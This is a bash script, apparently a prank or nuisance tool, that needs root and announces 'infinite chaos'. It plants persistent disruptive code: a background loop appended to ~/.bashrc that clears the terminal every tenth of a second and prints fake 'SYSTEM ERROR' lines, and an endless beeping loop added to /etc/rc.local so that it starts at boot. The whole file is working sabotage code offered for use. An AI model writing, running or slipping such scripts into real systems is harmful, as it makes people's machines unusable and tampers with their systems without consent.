#!/bin/bash

#!/bin/bash

# Check if the script is run as root
if [ "$(id -u)" -ne 0 ]; then
    echo "You must run this script as root!"
    exit 1
fi

echo "🔥 Installing infinite chaos... 🔥"

### 1️⃣ ADD TERMINAL FLICKER TO ~/.bashrc ###
if ! grep -q "Flickering Madness" ~/.bashrc; then
    echo "Adding terminal flicker to .bashrc..."
    cat >> ~/.bashrc << 'EOF'

# 🎃 Flickering Madness 🎃
if [[ $- == *i* ]]; then
    nohup bash -c '
        while true; do
            clear
            ls -la /
            date
            echo "SYSTEM ERROR: $(date)"
            sleep 0.1
        done
    ' >/dev/null 2>&1 &
fi

EOF
fi

### 2️⃣ ADD BEEPING NOISE TO /etc/rc.local ###
if [[ ! -f /etc/rc.local ]]; then
    echo "Creating /etc/rc.local..."
    sudo bash -c 'echo "#!/bin/bash" > /etc/rc.local'
    sudo chmod +x /etc/rc.local
fi

if ! grep -q "Infinite Beeping" /etc/rc.local; then
    echo "Adding infinite beeping to /etc/rc.local..."
    sudo bash -c 'cat >> /etc/rc.local << "EOF"

# 🔊 Infinite Beeping 🔊
nohup bash -c "
    while true; do
        echo -e \"\a\"
        sleep 0.5
    done
" >/dev/null 2>&1 &

EOF'
fi

### 3️⃣ APPLY CHANGES IMMEDIATELY ###
echo "Applying changes..."
source ~/.bashrc
sudo systemctl daemon-reexec 2>/dev/null # Reload services if possible

echo "🔥 Chaos installed! Reboot for full effect! 🔥"

